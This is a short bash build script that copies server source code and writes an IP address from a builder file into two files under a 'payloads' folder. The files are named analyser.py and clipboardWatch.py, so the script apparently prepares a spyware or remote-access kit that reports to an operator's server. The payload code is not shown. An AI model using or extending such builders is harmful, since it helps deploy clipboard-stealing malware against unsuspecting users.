#!/bin/bash
build=build_server
mkdir $build

cd $build

cp ../src/server/* . -r

# replace <REPLACE_IP> with ip.txt 
# sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" server.py
sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" payloads/analyser.py
sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" payloads/clipboardWatch.py
